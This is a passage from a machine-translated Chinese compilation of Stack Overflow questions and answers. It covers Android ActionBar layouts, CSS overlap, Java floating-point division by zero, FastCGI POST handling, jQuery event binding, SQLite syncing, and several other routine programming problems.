    <include layout="@layout/actionbar_done_button" />

</LinearLayout> 
```

/layout-v11/actionbar_discard_button.xml

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/actionbar_discard"
    style="?android:actionButtonStyle"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_weight="1"
    android:background="@drawable/selectable_background_mystyle" >

    <TextView style="?android:actionBarTabTextStyle"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:paddingRight="20dp"
        android:drawableLeft="@drawable/ic_menu_cancel"
        android:drawablePadding="8dp"
        android:gravity="center_vertical"
        android:text="@string/menu_cancel" />
</FrameLayout> 
```

/layout-v11/actionbar_done_button.xml

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/actionbar_done"
    style="?android:actionButtonStyle"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_weight="1"
    android:background="@drawable/selectable_background_mystyle" >

    <TextView
        style="?android:actionBarTabTextStyle"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:drawableLeft="@drawable/ic_menu_save"
        android:drawablePadding="8dp"
        android:gravity="center_vertical"
        android:paddingRight="20dp"
        android:text="@string/menu_save" />

</FrameLayout> 
```

***并使用 ActionBar Sherlock 对其进行反向移植***

/layout/actionbar_custom_view_done_discard.xml

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

   <include layout="@layout/actionbar_discard_button" />

    <View
        android:layout_width="0.5dp"
        android:layout_height="match_parent"
        android:layout_marginTop="12dp"
        android:layout_marginBottom="12dp"
        android:background="#55FFFFFF" />

    <include layout="@layout/actionbar_done_button" />

</LinearLayout> 
```

/layout/actionbar_discard_button.xml

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/actionbar_discard"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_weight="1"
    android:paddingRight="20dp"
    android:background="@drawable/selectable_background_mystyle" >

    <TextView
        style="@style/Widget.Sherlock.ActionBar.TabText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:drawableLeft="@drawable/ic_menu_cancel"
        android:drawablePadding="8dp"
        android:gravity="center_vertical"
        android:text="@string/menu_cancel" />

</FrameLayout> 
```

/layout/actionbar_done_button.xml

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/actionbar_done"
    android:layout_width="0dp"
    android:layout_height="match_parent"
    android:layout_weight="1"
    android:paddingRight="20dp"
    android:background="@drawable/selectable_background_mystyle" >

    <TextView
        style="@style/Widget.Sherlock.ActionBar.TabText"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_gravity="center"
        android:drawableLeft="@drawable/ic_menu_save"
        android:drawablePadding="8dp"
        android:gravity="center_vertical"
        android:text="@string/menu_save" />

</FrameLayout> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-09-03T14:15:31.637

为了完成@Vlasto Benny Lava[描述](https://stackoverflow.com/a/15390898/451962)的使用说明，这里**是实际设置 ActionBar 的代码**（基于 Roman Nurik 的 API 14 的[原始代码](https://android.googlesource.com/platform/developers/samples/android/+/master/ui/actionbar/DoneBar/src/com/example/android/donebar/DoneBarActivity.java)）——适用于**ActionBarSherlock**的使用。

```
// BEGIN_INCLUDE (inflate_set_custom_view)
// Inflate a "Done/Cancel" custom action bar view.
final LayoutInflater inflater = (LayoutInflater) getSherlockActivity().getSupportActionBar()
    .getThemedContext().getSystemService(Activity.LAYOUT_INFLATER_SERVICE);
final View customActionBarView = inflater.inflate(R.layout.actionbar_custom_view_done_discard,
    null);
customActionBarView.findViewById(R.id.actionbar_done).setOnClickListener(
    new View.OnClickListener() {
      @Override
      public void onClick(View v) {
        // "Done"
        Toast.makeText(getActivity(), "DONE", Toast.LENGTH_SHORT).show();
      }
    });
customActionBarView.findViewById(R.id.actionbar_discard).setOnClickListener(
    new View.OnClickListener() {
      @Override
      public void onClick(View v) {
        // "Cancel"
        Toast.makeText(getActivity(), "DISCARD", Toast.LENGTH_SHORT).show();
      }
    });

// Show the custom action bar view and hide the normal Home icon and title.
final ActionBar bar = getSherlockActivity().getSupportActionBar();
bar.setDisplayOptions(ActionBar.DISPLAY_SHOW_CUSTOM, ActionBar.DISPLAY_SHOW_CUSTOM
    | ActionBar.DISPLAY_SHOW_HOME | ActionBar.DISPLAY_SHOW_TITLE);
bar.setCustomView(customActionBarView, new ActionBar.LayoutParams(
    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));
// END_INCLUDE (inflate_set_custom_view) 
```

我将它用于 a`Fragment`因此`getSherlockActivity()`. 如果在 中使用`Activity`，您可以自由省略该部分。

有两个地方可以设置这个自定义 ActionBar：

1.  在 Activity **`onCreate()`**（或 Fragments **`onAttach()`**）中，

2.  在活动/片段**`onCreateOptionsMenu()`**中。

关于如何将 ActionBar 恢复为“原始”表单的过程（在选择 DONE 或 DISCARD 之后），您可以参考[这个答案](https://stackoverflow.com/a/13885635/451962)。

# html - 无法点击 或元素，浏览器会显示它们

> ID：12954188
> 
> 赞同：1
> 
> 时间：2012-10-18T12:05:16.780
> 
> 标签：html, css, padding

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T12:11:17.457

问题是你的 CSS 我你的#container。

您有以下 CSS

```
#container {
    padding-right: 220px;
    position: relative;
} 
```

您需要将填充更改为边距，因为填充填充了整个空间，然后元素将定位在最后两个链接上。这就是它们不可选择的原因。

改成

```
#container {
    margin-right: 260px;
    position: relative;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:09:39.573

您的问题是您的 #container 与右侧的菜单重叠。将此添加到 css 中的 .mini-panel（style.php 中的第 4020 行）位置：相对；z-索引：1000；

那应该对你有用。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-18T12:14:58.407

进入你的CSS并编辑元素：

```
#container {
    padding-right: 220px;
    position: relative;
} 
```

把它变成：

```
#container {
    margin-right: 260px;
    position: relative;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-18T12:07:50.333

它们都位于您的容器 div 下方。尝试使用[z-index](http://www.w3schools.com/cssref/pr_pos_z-index.asp)将其放在后面或设计您的页面，使您的 div 不重叠。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-18T12:09:18.207

容器 div 与右侧菜单重叠。所以设置以下CSS：

```
.mini-panel{
   position: absolute;
   z-index: 1000;
   width: 200px;
} 
```

或者你可以减少#container 的宽度。

# java - 为什么用浮点数（或双精度）数字除以零不会抛出 java.lang.ArithmeticException: / Java 中的零

> ID：12954193
> 
> 赞同：66
> 
> 时间：2012-10-18T12:05:24.807
> 
> 标签：java, exception, arithmeticexception, dividebyzeroexception

下面的语句`java.lang.ArithmeticException: / by zero`很明显。

```
System.out.println(0/0); 
```

因为文字`0`被认为是`int`文字，整数运算中不允许除以零。

但是，以下情况**不会**引发任何异常，例如`java.lang.ArithmeticException: / by zero`.

```
int a = 0;
double b = 6.199;
System.out.println((b/a)); 
```

它显示`Infinity`.

以下语句`NaN`毫无例外地产生 (Not a Number)。

```
System.out.println(0D/0); //or 0.0/0, or 0.0/0.0 or 0/0.0 - floating point arithmetic. 
```

在这种情况下，两个操作数都被认为是双精度的。

* * *

同样，以下语句**不会**引发任何异常。

```
double div1 = 0D/0; //or 0D/0D
double div2 = 0/0D; //or 0D/0D

System.out.printf("div1 = %s : div2 = %s%n", div1, div2);
System.out.printf("div1 == div2 : %b%n", div1 == div2);
System.out.printf("div1 == div1 : %b%n", div1 == div1);
System.out.printf("div2 == div2 : %b%n", div2 == div2);
System.out.printf("Double.NaN == Double.NaN : %b%n", Double.NaN == Double.NaN);
System.out.printf("Float.NaN == Float.NaN : %b%n", Float.NaN == Float.NaN); 
```

它们产生以下输出。

```
div1 = NaN : div2 = NaN
div1 == div2 : false
div1 == div1 : false
div2 == div2 : false
Double.NaN == Double.NaN : false
Float.NaN == Float.NaN : false 
```

它们都返回`false.`为什么浮点数或双精度数允许此操作（除以零）？

* * *

顺便说一句，我可以理解浮点数（双精度数）的值代表*正无穷大*， *负无穷大*，*而不是数字*（`NaN`）......

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-10-18T12:16:32.150

简而言之，这就是 IEEE-754 标准中指定的方式，这是 Java 的[浮点运算](http://docs.oracle.com/javase/specs/jls/se7/html/jls-4.html#jls-4.2.3)所基于的。

> [**为什么除以零（或上溢或下溢）不会停止程序或触发错误？为什么数字标准包括“非数字”（NaN）？**](https://web.archive.org/web/20180112211305/http://grouper.ieee.org/groups/754/faq.html#exceptions)
> 
> 754 模型鼓励强大的程序。它不仅适用于数值分析师，还适用于电子表格用户、数据库系统甚至咖啡壶。NaN 和无穷大的传播规则允许无关紧要的异常消失。类似地，逐渐下溢在精度范围内保持误差属性。
> 
> 当需要注意异常情况时，可以通过陷阱立即检查它们，或者在方便的时候通过状态标志检查它们。陷阱可用于停止程序，但不可恢复的情况极为罕见。简单地停止程序不是嵌入式系统或网络代理的选项。更多情况下，陷阱会记录诊断信息或替换有效结果。
> 
> 标志提供可预测的控制流和速度。它们的使用要求程序员了解异常情况，但标记粘性允许程序员延迟处理异常情况，直到必要时。

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2012-10-18T12:16:40.260

之所以如此，是因为 IEEE 754 就是这样定义它的。

除以浮点 0.0 产生 NaN 或 +/-Inf，具体取决于分子是否为 0。

除以整数 0 不在 IEEE 754 中，并且会生成异常 - 没有其他方法可以指示错误，因为`int`无法表示`NaN`or `Inf`。

生成异常类似于`INT`x86 微处理器上除以零所生成的（软件）。

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2012-10-18T12:09:10.950

**超越无限**

```
class DoubleDivision {

    public static void main(String[] args) {
        System.out.println(5.0/0.0);
    }
} 
```

上面的代码和你提到的片段给出了`infinity`.

为什么 Java 使用`Double`s 来表示小数。二进制不能完全表示一个数字，它只能表示一个近似值，因此 Java 的 double 也不能。

想象一个非常接近于零的数字。如果您知道微积分，请想象一个为零的极限。变量将接近零到某个可以想象的微小距离，但永远不会完全相等。你可以想象，对吧？好吧，假设这个数字对于 Java 来说需要如此高的精度来表示，它放弃并调用它，`0.0`因为它没有一个好的替代方案。**这就是这里发生的事情。任何常规数除以接近于零的超接近数基本上是无穷大**。试试看：`5 / (10^-100)`。

另请参阅部分：[数学错误中的](http://www.physics.nyu.edu/grierlab/idl_html_help/errors12.html)**特殊浮点值**以获取更多信息:)

相关问题：[为什么 1/0 给出错误但 1.0/0/0 给出 inf](https://stackoverflow.com/questions/5291606/why-does-1-0-give-error-but-1-0-0-returns-inf)

更新： set`INT`中没有无穷大和`NaN`值，而 float 确实有无穷大和`NaN`值。（根据java遵循的IEEE 754标准）

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-10-18T12:16:02.250

当除以零时，计算机无法将结果表示为数字。计算机需要发出信号表明结果不是数字。

对于浮点值，它可以产生一个特殊的非数字标记值，因为有一些不代表数字的 32 位 (for `float`) 和 64 位 (for `double`) 位模式，因此可以解释为 not -a 数字 ( `NaN`)。

对于使用常见二进制补码方案（如 Java 要求）的整数值，所有 32 位（for `int`）和 64 位（for `long`）位模式都表示一个数字。因此计算机无法使用哨兵报告问题。它必须以某种方式“带外”报告问题。抛出异常是为 Java 选择的带外方法。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-10-18T12:15:30.670

Java 遵循 IEEE 754 标准，该标准定义了在被零除的情况下默认返回的值。[http://en.wikipedia.org/wiki/IEEE_754#Exception_handling](http://en.wikipedia.org/wiki/IEEE_754#Exception_handling)

> 除以零（对有限操作数的运算给出精确的无限结果，例如 1/0 或 log(0)）（默认返回 ±infinity）。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-09-18T11:41:12.050

```
import java.util.Scanner;

public class Division {

    public static void main(String[] args) {
        int a, b;
        float result;

        Scanner input = new Scanner(System.in);
        System.out.println("Enter value for a : ");
        a = input.nextInt();

        System.out.println("Enter value for b : ");
        b = input.nextInt();

        try {
            /* here we used "if clause" because result will be in float
             note: Here result is in float, so JVM Cant Catch Exception.
             if we Try to Divide with Zero with Float Values It gives Output as
             Divided by Zero is Infinity */
            if (b != 0) {
                result = (float) a / b;
                System.out.println("Result of " + a + " divided by " + b + " is : " + result);
            } else // here result will be in integer so Jvm can easily Catch The Exception
            {
                result = a / b;
            }
        } catch (ArithmeticException e) {
            System.out.println("Sorry Division By Zero Is Not Possible");
        }
    }
}

/* Ouput :
Enter value for a :2
Enter value for b : 7
Result of 2 divided by 7 is : 0.2857143 */

 /* Ouput :
Enter value for a : 16
Enter value for b : 0
Sorry Division By Zero Is Not Possible */ 
```

# c++ - 如何使用 fastcgi C/C++ 应用程序访问 POST 请求的主体

> ID：12954196
> 
> 赞同：13
> 
> 时间：2012-10-18T12:05:32.783
> 
> 标签：c++, c, web-applications, nginx, fastcgi

我在 C++ 应用程序中使用来自[http://fastcgi.com/](http://fastcgi.com/)的库作为后端，使用 nginx Web 服务器作为前端。

从 HTML 表单成功发布文件，并且可以在 nginx 服务器端看到临时文件。但我不知道如何使用 fastcgi_stdio 访问多部分 POST 请求的主体。这是我的 HTML 表单。

```
<html>
    <head>
        <title>Test Server</title>
        <script src="http://code.jquery.com/jquery.min.js"></script>
    </head>
    <body>
        <form id="upload-form" method="post" target="upload_target"   enctype="multipart/form-data" action="/upload">
            <input name="file" id="file" size="27" type="file" /><br />
            <input type="submit" name="action" value="Upload" /><br />
            <iframe id="upload_target" name="upload_target" src="" style="width:100%;height:100px;border:0px solid #fff;"></iframe>
        </form>
    </body>
</html> 
```

我的 nginx 配置文件：

```
location /upload {

# Pass altered request body to this location
upload_pass @test;

# Store files to this directory
# The directory is hashed, subdirectories 0 1 2 3 4 5 6 7 8 9 should exist
upload_store /www/test;

# Allow uploaded files to be read only by user
upload_store_access user:rw group:r all:r;

# Set specified fields in request body
upload_set_form_field $upload_field_name.name $upload_file_name;
upload_set_form_field $upload_field_name.content_type "$upload_content_type";
upload_set_form_field $upload_field_name.path "$upload_tmp_path";

# Inform backend about hash and size of a file
upload_aggregate_form_field "$upload_field_name.md5" "$upload_file_md5";
upload_aggregate_form_field "$upload_field_name.size" "$upload_file_size";

upload_pass_form_field "^submit$|^description$";
upload_cleanup 400 404 499 500-505;
}

include fastcgi.conf;

# Pass altered request body to a backend
location @test {
        fastcgi_pass  localhost:8080
} 
```

现在，如何在我的 fastcgi c++ 应用程序中处理/获取 POST 请求正文，以及如何在 fastcgi 应用程序端将其写入适当的文件中？

有没有更好的快速模块来实现这一点？

谢谢你。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-18T14:10:44.453

您可以通过流访问`POST`正文。`FCGI_stdin`例如，您可以使用 一次读取一个字节`FCGI_getchar`，它是`FCGI_fgetc(FCGI_stdin)`. 您可以使用`FCGI_fread`. 所有这一切都是我在查看[源代码](http://www.fastcgi.com/devkit/libfcgi/fcgi_stdio.c)时发现的。这些资料来源经常引用一个叫做“H&S”的东西——它代表“Harbison and Steele”，*[C: A Reference Manual](http://careferencemanual.com/)*一书的作者，数字指的是该书的章节和章节。

顺便说一下，它被称为“stdio”，代表“标准输入/输出”。不是“工作室”。这些函数应该大多表现得像没有`FCGI_`前缀的对应函数。[`getchar`](http://linux.die.net/man/3/getchar)因此，有关详细信息，请查看 等的手册页[`fread`](http://linux.die.net/man/3/fread)。

在应用程序中获得字节后，您可以使用普通的 stdio 操作或通过`FCGI_fopen`. 但是请注意，输入流不会直接对应于上传文件的内容。相反，MIME 编码用于传输所有表单数据，包括文件。如果要访问文件数据，则必须[解析该流。](https://stackoverflow.com/questions/3794358/how-to-parse-http-postfile-upload-stream)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-11-18T23:42:06.997

用这个：

```
char * method = getenv("REQUEST_METHOD");
if (!strcmp(method, "POST")) {
    int ilen = atoi(getenv("CONTENT_LENGTH"));
    char *bufp = malloc(ilen);
    fread(bufp, ilen, 1, stdin);
    printf("The POST data is<P>%s\n", bufp);
    free(bufp);
} 
```

# tridion - Tridion 和 SmartTarget：tcdl 标签转换为 代替

> ID：12954202
> 
> 赞同：8
> 
> 时间：2012-10-18T12:05:50.573
> 
> 标签：tridion, tridion-2011, smarttarget

我按照 SDL Live Content 中的说明在 Tridion 2011 环境 (.NET) 上安装了 SmartTarget 2011 SP1。

问题是当我发布一个页面时，我所有的

```
<tcdl:xxxx> 
```

标签被转换为

```
<smarttarget:xxx> 
```

不好的是

```
<tcdl:ComponentPresentation> 
```

也转化为

```
<smarttarget:ComponentPresentation> 
```

代替

```
<tridion:ComponentPresentation> 
```

我错过了什么？谢谢！

编辑添加 cd_deployer_conf.xml 的 TCDLEngine 部分（我删除了注释行）：

```
<TCDLEngine> 
    <Properties> 
        <Property Name="tcdl.dotnet.style" Value="controls"/>  
        <Property Name="tcdl.jsp.style" Value="tags"/>  
    <Property Name="aspnet.tagprefix" Value="tridion" />
    <Property Name="aspnet.tagprefix" Value="smarttarget" />
    </Properties>  

    <TagBundle Resource="com/tridion/smarttarget/tcdl/tagbundle.xml"/>
</TCDLEngine> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T13:20:22.070

为您的 Deployer 配置删除以下元素：

```
<Property Name="aspnet.tagprefix" Value="tridion" />
<Property Name="aspnet.tagprefix" Value="smarttarget" /> 
```

# css - Yii 资产管理器 - 带有图片 url 的 css

> ID：12954203
> 
> 赞同：6
> 
> 时间：2012-10-18T12:05:54.693
> 
> 标签：css, yii, assets, brokenimage

我正在使用以下代码将我的 css 文件发布到资产。

```
Yii::app()->clientScript->registerCssFile( Yii::app()->assetManager->publish( Yii::getPathOfAlias('application').'/../css/combo-autocomplete.css' )); 
```

它成功注册了 css 并且样式工作正常，但是下面的 css 类使用图像。

```
.ui-icon {
   background-image: url(../images/down-arrow.png); 
} 
```

没有加载，它被引用到资产文件夹中的路径。它正在寻找里面的图像

> 根/资产/图像/

有没有办法将css中的图像url重定向到原始路径，因为我现在还没有将我的图像注册为资产。

> 根/图像

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-18T12:33:15.843

Yii 的资产管理器旨在让您以自包含的方式打包 UI 小部件等组件（另一种方法是在应用程序目录结构中的不同位置手动分发各种文件）。因此，如果从组件中将*任何内容作为资产发布是有意义的，那么将**所有内容*发布为资产也是有意义的。

在这种情况下，您应该构建您的组件，例如

```
component/
    assets/
        css/
        images/
        js/ 
```

`assets/`然后，使用 Yii 的资产管理器发布整个目录，而不是一个一个地发布文件。如果您这样做，它们最终将以类似的方式发布

```
assets/
    random_hash/
        css/
        images/ 
```

然后，您的 CSS 可以简单地引用图像，`url(../images/image.jpg)`而无需知道`random_hash`.

# jquery - 如何在 jQuery Mobile 中刷新页面？

> ID：12954205
> 
> 赞同：0
> 
> 时间：2012-10-18T12:06:06.390
> 
> 标签：jquery, ajax, jquery-mobile, refresh, transitions

每当我从我的 jQuery Mobile 应用程序上的另一个页面导航回我的 index.html 时，css 就会搞砸，需要刷新才能再次看起来正常。我尝试添加`data-ajax="false"` 到所有链接以禁用任何转换，并且它的工作原理最低限度，但是一旦我开始在应用程序中导航并单击返回我的家，它就会再次混乱。关于如何解决这个问题的任何想法？

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-26T07:33:27.867

jQuery Mobile 用户： **使用 $(document).bind('pageinit')** !!!!!! **不要使用 $(document).ready()**

谢谢@Phill Pafford！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:13:01.697

jQM Docs:

*   [http://jquerymobile.com/demos/1.2.0/docs/pages/page-scripting.html](http://jquerymobile.com/demos/1.2.0/docs/pages/page-scripting.html)

Try `.trigger( "create" );` on the page element

# jquery - 如何在 Jquery 中将 .live() 与链式选择器一起使用？

> ID：12954211
> 
> 赞同：0
> 
> 时间：2012-10-18T12:06:26.597
> 
> 标签：jquery, jquery-ui

我有这个代码：

```
$('.ui-datepicker-calendar tr').live('mouseleave', function() { 
    $(this).find('td a').removeClass('ui-state-hover'); 
}); 
```

这会影响页面上的所有日期选择器。我想定位一个特定的日期选择器，所以我这样做：

```
var specificPicker = $(this).datepicker("widget"); 
```

然后我想做：

```
$(specificPicker).find('.ui-datepicker-calendar tr').live('mouseleave', function() { 
    $(this).find('td a').removeClass('ui-state-hover'); 
}); 
```

但`live()`不支持链接。

该文档建议`live()`已弃用，我应该使用，但如果我用而不是`on()`替换这两种调用方法中的任何一种，它就不起作用。`.on``.live`

我怎样才能得到这个工作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:08:30.490

由于工作方式，你不能这样做`.live()`。它将事件附加到文档本身，然后检查事件来自的元素是否与`$('...')`调用之前使用的选择器匹配`.live()`。

正确的使用方法`.on()`是这样的：

```
$('existing-element-selector')
    .on('mouseleave', '.dynamic-element-selector', callbackFunction); 
```

在你的情况下是这样的：

```
$(specificPicker).on('mouseleave', '.ui-datepicker-calendar tr', function() {
    // ...
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T12:08:52.023

替换`.live()`为`.on()`不是查找和替换操作。

你需要改变这个：

```
$("selector").live("event", handler); 
```

对此：

```
$("base-selector").on("event", "descendant-selector", handler); 
```

`base-selector`和的值`descendant-selector`必须从初始的`selector`; 您可以使用`document`as`base-selector`并设置为直接转换的`descendant-selector`任何内容`selector`。

因此，为了实现与此相同的行为：

```
$(specificPicker).find('.ui-datepicker-calendar tr')
.live('mouseleave', function() { 
    $(this).find('td a').removeClass('ui-state-hover'); 
}); 
```

做这个：

```
$(specificPicker).on("mouseleave", '.ui-datepicker-calendar tr', function() { 
    $(this).find('td a').removeClass('ui-state-hover'); 
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:10:54.860

如果您要坚持使用您正在使用的 jQuery 版本，因此坚持使用 using `live()`，试试这个...

```
$(specificPicker).find('.ui-datepicker-calendar tr').each(function() {
    $(this).live('mouseleave', function() {
        $(this).find('td a').removeClass('ui-state-hover');
    });
}); 
```

只需用于`each()`解析所选元素并将事件处理程序附加到它们。

# c# - SQLite Database Locked - 使用逐行更新/插入实时同步两个数据库

> ID：12954212
> 
> 赞同：0
> 
> 时间：2012-10-18T12:06:30.027
> 
> 标签：c#, sqlite, xpo

我们目前在多用户环境中使用 SQLite 遇到数据库锁定问题。由于已关闭日志记录以减少数据库锁定异常的数量，因此这些问题与常规数据库畸形问题相结合。

我的同事目前正在实施一种同步算法，以允许用户在本地 SQLite 数据库上工作，并将该数据近乎即时地传输到网络上的主数据库。

当更改本地行时，同步标志设置为真。同步算法由每秒运行的计时器触发，包括上传和下载两种方法。下面提到的任何 SQL 命令都是使用 String.Format 构建的。

在上传期间，会扫描本地数据库以查找同步标志为真的行。像这样的每一行要么被更新，要么被插入到主数据库中（取决于是否可以找到具有相同 PK 的行）。

在下载过程中，每个本地表都会逐行、逐字段地与主数据库中的相应表进行比较（两个表都作为数组结构加载到内存中以加快比较速度）。如果发现任何差异，或者缺少本地行，则使用主数据库中的数据更新/插入本地行

忽略这样一个明显的事实，即这不会解决我们的锁定/畸形问题，我的直觉告诉我这是一个糟糕的想法，但我很难向那个权力解释这个。任何人都可以提供一些理由来说明为什么这将是一个糟糕的想法，或者可能是我忽略了一些积极因素。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T14:16:35.640

关闭日志不会减少锁定冲突的数量，它只是将锁定异常转换为有*保证*的数据库损坏。

处理锁定冲突的正确方法是等到另一个连接完成更改。使用 System.Data.SQLite 时，可以将其设置为`Default Timeout`连接字符串，默认为 30 秒（我不知道 XPO 使用什么驱动程序）。如果这不能给你足够的并发性，你应该切换到像 MySQL 或 PostgreSQL 这样的客户端/服务器数据库。

同步下载很愚蠢：无论如何您都在读取整个数据库，因此将整个数据库文件复制到本地机器会更容易和更快。

* * *

如果您认为[The Authorities](http://www.sqlite.org/crew.html)的一句话更有可能说服您的 PHB，请在[sqlite-users 邮件列表中](http://sqlite.org:8080/cgi-bin/mailman/listinfo/sqlite-users)提出这个问题。

# reporting-services - 未指定报告定义的来源

> ID：12954216
> 
> 赞同：1
> 
> 时间：2012-10-18T12:06:35.647
> 
> 标签：reporting-services

我收到以下错误

```
the source of report definition has not been specified 
```

这是我正在使用的代码

```
ReportViewer ReportViewer1 =null;

ReportPath = "Reports/BatchOtherComments.rdlc";
...
        rptData.DataSetName = "spReport_LoanSummaryBatchOther";
        objReportDataSource = new ReportDataSource("spReport_LoanSummaryBatchOther", rptData.Tables[0]);
        rep.DataSources.Add(objReportDataSource);

        Warning[] warnings;
        string mimeType;
        string encoding;
        string extension;
        string deviceInfo;
        string[] streamids;
        deviceInfo =
          "<DeviceInfo>" +
          "  <OutputFormat>PDF</OutputFormat>" +
          "  <PageSize>A4</PageSize>" +
          "  <PageWidth>8.5in</PageWidth>" +
          "  <PageHeight>11in</PageHeight>" +
          "  <MarginTop>0.25in</MarginTop>" +
          "  <MarginLeft>0.25in</MarginLeft>" +
          "  <MarginRight>0.25in</MarginRight>" +
          "  <MarginBottom>0.25in</MarginBottom>" +
          "</DeviceInfo>";
        byte[] bytes = ReportViewer1.ServerReport.Render("PDF", null, out mimeType, out encoding, out extension, out streamids, out warnings);
        FileStream fs = new FileStream(@"C:/Users/wnaeem/Sample.PDF", FileMode.Create);
        fs.Write(bytes, 0, bytes.Length);
        fs.Close();
    }
}
catch (Exception ex)
{
    throw ;
}
finally
{
    ReportViewer1.Dispose();
} 
```

# c# - 在什么时候创建 IOC 容器中定义的类的实例

> ID：12954217
> 
> 赞同：0
> 
> 时间：2012-10-18T12:06:35.793
> 
> 标签：c#, asp.net-mvc, inversion-of-control, unity-container

我最近参与了一个大型项目，我对 Unity 和 IOC/DI 的经验很少，我正在寻找关于在 Unity 容器中定义实例时如何创建实例的说明。

给定以下代码；

//统一配置

```
container.RegisterAsSingleton<IService, Service>(); 
```

//基本控制器类中的引用

```
private readonly IService _Service;

protected DefaultController(IService Service)
{
    _Service = Service;
}

protected string UseService(string id)
{
    return _Service.Method(id);
} 
```

我是否需要使用类似的东西（在 MVC 解决方案中）初始化一个实例；

`_Service = DependencyResolver.Current.GetService<IService>()`;

还是会在第一次调用 Service 方法时创建一个实例？

```
_Service.Method(id); 
```

如果需要，我正在尝试找出放置此代码的最佳位置。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:38:24.223

我当然不能确定，但​​通常使用 DI 的 MVC 项目的连接方式是 DI 容器不仅用于创建 IService 实例，还用于创建依赖于 IService 的 DefaultController。

MVC 框架具有可用于提供自己的构造逻辑的扩展点，例如使用像 Unity 或 Windsor 这样的 DI 容器。如果您的项目已经使用 DI，那么它可能已经以这种方式设置。

因此，如果一切都正确连接（DI 容器创建控制器，IService 已注册到 DI 容器），则 IService 依赖项将注入 DefaultController 构造函数。您不必做任何事情，在调用控制器方法时应该已经创建了 IService。

# c++ - 宏传递了 2 个参数，但只需要 1 个

> ID：12954224
> 
> 赞同：1
> 
> 时间：2012-10-18T12:06:50.653
> 
> 标签：c++, compiler-construction, compiler-errors, avr-gcc

我的代码没有成功构建此错误消息：

```
macro "hton_us" passed 2 arguments, but takes just 1 
```

它发生在这一行：

```
hton_us( &fi.size, 1 ); 
```

这是对 hton_us 的引用

```
void hton_us( iu16 *us, iu8 num )
{
    iu16 local;

    while( num-- ) {
        local=*us;
        *us++=swap_us(local);
    }
} 
```

我读了一些类似的问题，告诉使用`typedef`但它对我没有帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:12:43.473

使用一点 C 预处理器技巧，您可以跳过宏并调用函数：

```
(hton_us)(&fi.size, 1); 
```

通过`hton_us`用括号括起来，它告诉编译器这个宏不能被扩展，因为它没有用任何参数调用，因此函数被调用了。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-18T12:10:03.190

检查你的头文件，你可能有以下内容：

```
#ifndef ENDIAN_LITTLE
#define hton_us(us)
#define hton_ul(ul)
#endif 
```

所以可能没有定义 ENDIAN_LITTLE

# jquery - JQuery datePicker 高亮颜色

> ID：12954226
> 
> 赞同：0
> 
> 时间：2012-10-18T12:07:02.923
> 
> 标签：jquery, jquery-ui, jquery-ui-datepicker

我为 datepicker 使用了以下主题，我需要自定义颜色更改。当我选择一个新的日期时，我需要改变颜色。

示例：需要自定义颜色的 25 Oct，因为它已经被选中。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:38:33.690

尝试将这些 css 添加到您的页面，因为`ui-state-active`它是您选择的日期的样式，并且`ui-state-highlight`是它用来识别当前日期的样式。

```
#ui-datepicker-div .ui-state-active {color: #FFFFCC;}

#ui-datepicker-div .ui-state-highlight {color: #DCDCDC;} 
```

# memory-management - 在 XNA 中，处理我不再需要的纹理的最佳方法是什么？

> ID：12954227
> 
> 赞同：2
> 
> 时间：2012-10-18T12:07:04.070
> 
> 标签：memory-management, xna, textures, out-of-memory

我开始了一个项目，其概念是在整个游戏中不断重复使用相同的 texture2d 对象，并定期重新加载新的纹理。随着时间的推移，这被证明是一个坏主意，因为我遇到了： System.OutOfMemoryException

```
 bool loadImages(string image)
    {
        System.Diagnostics.Debug.WriteLine("beginning loading textures " + image);

        try
        {
            //image_a = null;
            //image_o = null;

            //image_o.Dispose();
            //image_a.Dispose();

            image_o = Content.Load<Texture2D>("images/"+image);
